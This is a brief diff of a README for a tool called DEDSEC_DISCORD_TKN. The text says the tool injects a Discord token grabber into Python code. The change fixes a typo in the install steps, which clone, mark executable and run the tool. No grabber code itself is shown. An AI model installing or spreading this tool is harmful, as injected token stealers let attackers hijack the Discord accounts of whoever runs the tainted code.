@@ -9,7 +9,7 @@ DISCORD_TKN has the capability to inject a token grabber into Python code. When 
 
 ## INSTALLATION 
     * git clone https://github.com/0xbitx/DEDSEC_DISCORD_TKN.git
-    * cd DEDSEC_DISCORD_TKNf
+    * cd DEDSEC_DISCORD_TKN
     * chmod +x dedsec_discord_tkn
     * ./dedsec_discord_tkn
 ### TESTED ON FOLLOWING
